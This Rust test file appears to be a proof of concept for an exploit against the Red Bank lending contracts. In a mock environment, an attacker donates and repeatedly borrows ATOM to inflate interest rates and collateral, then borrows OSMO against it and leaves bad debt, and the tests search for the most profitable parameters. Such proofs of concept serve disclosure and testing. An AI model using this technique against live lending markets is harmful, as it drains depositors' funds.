use std::{cmp::min, str::FromStr};

use cosmwasm_std::{coin, Addr, Decimal, Uint128};
use mars_testing::integration::mock_env::MockEnvBuilder;
use mars_types::{
    params::{AssetParams, CmSettings, LiquidationBonus, RedBankSettings},
    red_bank::{InitOrUpdateAssetParams, InterestRateModel},
};

fn atom_asset_params(denom: &str) -> (InitOrUpdateAssetParams, AssetParams) {
    let market_params = InitOrUpdateAssetParams {
        reserve_factor: Some(Decimal::percent(10)),
        interest_rate_model: Some(InterestRateModel {
            optimal_utilization_rate: Decimal::percent(80),
            base: Decimal::percent(0),
            slope_1: Decimal::percent(20),
            slope_2: Decimal::percent(300),
        }),
    };
    let asset_params = AssetParams {
        denom: denom.to_string(),
        credit_manager: CmSettings {
            whitelisted: false,
            hls: None,
        },
        red_bank: RedBankSettings {
            deposit_enabled: true,
            borrow_enabled: true,
        },
        max_loan_to_value: Decimal::percent(74),
        liquidation_threshold: Decimal::percent(75),
        liquidation_bonus: LiquidationBonus {
            starting_lb: Decimal::zero(),
            slope: Decimal::from_str("1").unwrap(),
            min_lb: Decimal::percent(5),
            max_lb: Decimal::percent(20),
        },
        protocol_liquidation_fee: Decimal::percent(25),
        deposit_cap: Uint128::from(700000000000u128),
    };
    (market_params, asset_params)
}

fn osmo_asset_params(denom: &str) -> (InitOrUpdateAssetParams, AssetParams) {
    let market_params = InitOrUpdateAssetParams {
        reserve_factor: Some(Decimal::percent(10)),
        interest_rate_model: Some(InterestRateModel {
            optimal_utilization_rate: Decimal::percent(60),
            base: Decimal::percent(0),
            slope_1: Decimal::percent(15),
            slope_2: Decimal::percent(300),
        }),
    };
    let asset_params = AssetParams {
        denom: denom.to_string(),
        credit_manager: CmSettings {
            whitelisted: false,
            hls: None,
        },
        red_bank: RedBankSettings {
            deposit_enabled: true,
            borrow_enabled: true,
        },
        max_loan_to_value: Decimal::percent(73),
        liquidation_threshold: Decimal::percent(75),
        liquidation_bonus: LiquidationBonus {
            starting_lb: Decimal::zero(),
            slope: Decimal::from_str("1").unwrap(),
            min_lb: Decimal::percent(5),
            max_lb: Decimal::percent(20),
        },
        protocol_liquidation_fee: Decimal::percent(25),
        deposit_cap: Uint128::from(10000000000000u128),
    };
    (market_params, asset_params)
}

#[derive(Debug)]
struct BestPoCParameters {
    iterations: Option<u128>,
    funded_atom: Option<u128>,
    usd_profit: Option<i128>,
    uosmo_collateral: Option<u128>,
}

#[test]
fn inflate_collateral_poc_1() {
    let seconds_to_wait: u64 = 60 * 60 * 4 + 0 * 60; // 4h
    let block_gas_utilization_percentage = Decimal::percent(95); // Block gas utilization by attacker
    let (usd_profit, uosmo_collateral) =
        run(450, 1024000000, seconds_to_wait, block_gas_utilization_percentage);

    println!("usd_profit: {:#?}", usd_profit);
    println!("uosmo_collateral: {:#?}", uosmo_collateral);

    assert_eq!(usd_profit, 261042);
}

#[test]
fn inflate_collateral_poc_2() {
    let mut best_params = BestPoCParameters {
        iterations: None,
        funded_atom: None,
        usd_profit: Some(i128::MIN),
        uosmo_collateral: Some(u128::MAX),
    };

    let mut iterations = 100u128;
    let iterations_increment = 10u128;
    let iterations_max = 5_000u128;
    let funded_atom_max = 10_000_000_000_u128;
    let max_uosmo_collateral: Option<u128> = Some(10_000_000_000_000_u128); // Upper bound for the used OSMO collateral
    let seconds_to_wait: u64 = 60 * 60 * 3 + 45 * 60; // 4h
    let block_gas_utilization_percentage = Decimal::percent(95); // Block gas utilization by attacker

    let mut total_iterations = 0u128;

    while iterations <= iterations_max {
        let mut funded_atom = 1_000_000_u128; // Initial collateral that will get its interest inflated later

        while funded_atom <= funded_atom_max {
            println!("Running with iterations: {:#?}, funded_atom: {:?}", iterations, funded_atom);

            let (usd_profit, uosmo_collateral) =
                run(iterations, funded_atom, seconds_to_wait, block_gas_utilization_percentage);

            println!("Current Profit: {:#?}", usd_profit);

            let is_lower_than_max_uosmo_collateral = max_uosmo_collateral.is_none()
                || (max_uosmo_collateral.is_some()
                    && uosmo_collateral <= max_uosmo_collateral.unwrap());

            if usd_profit > best_params.usd_profit.unwrap() && is_lower_than_max_uosmo_collateral {
                best_params.iterations = Some(iterations);
                best_params.funded_atom = Some(funded_atom);
                best_params.usd_profit = Some(usd_profit);
                best_params.uosmo_collateral = Some(uosmo_collateral);
            }

            println!("Best params: {:#?}", best_params);

            funded_atom = funded_atom * 2; // Double collateral every iteration
            total_iterations += 1;
        }

        if iterations >= 1_000 {
            iterations += 500; // Increase iterations increment faster after 1k iterations
        } else if iterations >= 500 {
            iterations += 25; // Increase iterations increment faster after 500 iterations
        } else {
            iterations += iterations_increment;
        }
    }

    println!("Best params: {:#?}", best_params);
    println!("Total iterations: {:#?}", total_iterations);
}

fn run(
    iterations: u128,
    funded_atom: u128,
    seconds_to_wait: u64,
    block_gas_utilization_percentage: Decimal,
) -> (i128, u128) {
    /*
     * 1. Setup
     */
    let atom_price = Decimal::from_ratio(1133u128, 100u128); // 1 ATOM = 11.33 USD
    let osmo_price = Decimal::from_ratio(163u128, 100u128); // 1 OSMO = 1.63 USD

    let owner = Addr::unchecked("owner");
    let mut mock_env = MockEnvBuilder::new(None, owner).build();
    let oracle = mock_env.oracle.clone();
    oracle.set_price_source_fixed(&mut mock_env, "uatom", atom_price);
    oracle.set_price_source_fixed(&mut mock_env, "uosmo", osmo_price);

    let red_bank = mock_env.red_bank.clone();
    let params = mock_env.params.clone();

    let (atom_market_params, atom_asset_params) = atom_asset_params("uatom");
    red_bank.init_asset(&mut mock_env, &atom_asset_params.denom, atom_market_params);
    params.init_params(&mut mock_env, atom_asset_params.clone());

    let (osmo_market_params, osmo_asset_params) = osmo_asset_params("uosmo");
    red_bank.init_asset(&mut mock_env, &osmo_asset_params.denom, osmo_market_params);
    params.init_params(&mut mock_env, osmo_asset_params.clone());

    let borrower = Addr::unchecked("borrower");
    let borrower2 = Addr::unchecked("borrower2");
    let other_depositor = Addr::unchecked("otherdepositor");

    // Configurations
    let donated_atom = iterations * funded_atom; // ATOM amount needed to borrow all donated amount
                                                 // max_atom_borrow_amt = osmo_collateral * osmo_price * osmo_ltv / atom_price
                                                 // osmo_collateral = max_atom_borrow_amt * atom_price / (osmo_price * osmo_ltv)
    let osmo_collateral = Uint128::new(iterations * funded_atom)
        .checked_mul_floor(atom_price)
        .unwrap()
        .checked_div_floor(osmo_price)
        .unwrap()
        .checked_div_floor(osmo_asset_params.max_loan_to_value)
        .unwrap()
        .u128();
    let osmo_other_deposit = 3_059_483_963_978_u128; // OSMO deposit from someone else (OSMO funds already deposited in the market), simulate current mainnet OSMO deposit
    let max_block_gas_limit = "120".to_string(); // 120M

    println!("OSMO collateral required: {:#?}", osmo_collateral);
    /*
     * 1. Attacker deposits ATOM collateral
     */
    mock_env.fund_account(&borrower, &[coin(funded_atom, "uatom")]);
    red_bank.deposit(&mut mock_env, &borrower, coin(funded_atom, "uatom")).unwrap();

    /*
     * 2. Attacker "temporarily" donates ATOM to protocol (which will be borrowed later). For simplicity, all is donated at once, but it could also be donated in chunks
     */
    mock_env.fund_account(&red_bank.contract_addr, &[coin(donated_atom, "uatom")]);

    /*
     * 3. From another account, attacker deposits OSMO
     */
    let left_osmo_deposit = osmo_asset_params.deposit_cap - Uint128::new(osmo_other_deposit);
    let osmo_collateral = min(osmo_collateral, left_osmo_deposit.u128()); // deposit max allowed OSMO to fill the caps, otherwise it will be rejected
    mock_env.fund_account(&borrower2, &[coin(osmo_collateral, "uosmo")]);
    red_bank.deposit(&mut mock_env, &borrower2, coin(osmo_collateral, "uosmo")).unwrap();

    /*
     * 4. Fund OSMO market (representing OSMO funds from other depositors)
     */
    mock_env.fund_account(&other_depositor, &[coin(osmo_other_deposit, "uosmo")]);
    red_bank.deposit(&mut mock_env, &other_depositor, coin(osmo_other_deposit, "uosmo")).unwrap();

    /*
     * 4. Attacker borrows repeatedly for n times
     */
    for index in 0..iterations {
        let res = red_bank.borrow(&mut mock_env, &borrower2, "uatom", funded_atom);
        match res {
            Ok(_) => {}
            Err(e) => {
                println!("Current iter: {}", index);
                // Can't borrow more, max LTV reached
                println!("Error: {:#?}", e);
                break;
            }
        }

        // Simulate blocks by increasing block time every X iterations (assuming 83% utilization of blocks by attacker, max block gas limit 120M, borrow message consuming 1M gas)
        let is_new_block = index > 0
            && index
                % (block_gas_utilization_percentage
                    .checked_mul(Decimal::from_str(&max_block_gas_limit).unwrap())
                    .unwrap()
                    .to_uint_floor()
                    .u128())
                == 0;

        if is_new_block {
            mock_env.app.update_block(|b| b.time = b.time.plus_seconds(5));
        }
    }

    // Validate that borrower2 received all borrowed ATOM equal to the initially donated ATOM
    let atom_balance_borrower2 = mock_env.query_balance(&borrower2, "uatom").unwrap();
    // assert_eq!(atom_balance_borrower2.amount.u128(), donated_atom); // Can't borrow more than available collateral
    let left_atom_donated = Uint128::new(donated_atom) - atom_balance_borrower2.amount;

    // Validate that borrower2 has no OSMO left in balance
    let uosmo_balance_borrower2 = mock_env.query_balance(&borrower2, "uosmo").unwrap();
    assert_eq!(uosmo_balance_borrower2.amount.u128(), 0);

    /*
     * 5. Wait X hours
     */
    mock_env.app.update_block(|b| b.time = b.time.plus_seconds(seconds_to_wait));

    // Validate uosmo market borrow and liquidity rates are inflated
    let market = red_bank.query_market(&mut mock_env, "uatom");

    assert!(market.borrow_rate.gt(&Decimal::percent(10_000))); // Borrow rate is inflated
    assert!(market.liquidity_rate.gt(&Decimal::percent(10_000))); // Liquidity rate is heavily inflated

    let new_user_res = red_bank.query_user_collateral(&mut mock_env, &borrower, "uatom");

    let uosmo_borrow_amount = new_user_res
        .amount
        .checked_mul_floor(atom_price)
        .unwrap()
        .checked_mul_floor(atom_asset_params.max_loan_to_value)
        .unwrap()
        .checked_div_floor(osmo_price)
        .unwrap();

    /*
     * 6. Attacker borrows OSMO against (inflated) ATOM collateral
     */
    let uosmo_borrow_amount =
        min(uosmo_borrow_amount, Uint128::new(osmo_collateral + osmo_other_deposit)); // Borrow max allowed OSMO based on available liquidity
    red_bank.borrow(&mut mock_env, &borrower, "uosmo", uosmo_borrow_amount.u128()).unwrap();

    // Validate borrower has received borrowed OSMO
    let uosmo_balance_borrower = mock_env.query_balance(&borrower, "uosmo").unwrap();
    assert_eq!(uosmo_balance_borrower.amount.u128(), uosmo_borrow_amount.u128());

    // Validate borrower has OSMO debt (Representing bad debt)
    let uosmo_debt_borrower = red_bank.query_user_debt(&mut mock_env, &borrower, "uosmo");
    assert_eq!(uosmo_debt_borrower.amount.u128(), uosmo_borrow_amount.u128());

    // Calculate profit
    let usd_funded_osmo =
        Uint128::new(osmo_collateral).checked_mul_floor(osmo_price).unwrap().u128() as i128;
    let usd_uosmo_borrow_amount =
        uosmo_borrow_amount.checked_mul_floor(osmo_price).unwrap().u128() as i128;
    let usd_left_atom_donated =
        left_atom_donated.checked_mul_floor(atom_price).unwrap().u128() as i128;

    let usd_profit = usd_uosmo_borrow_amount - usd_funded_osmo - usd_left_atom_donated;

    (usd_profit.checked_div(1_000_000).unwrap(), osmo_collateral)
}
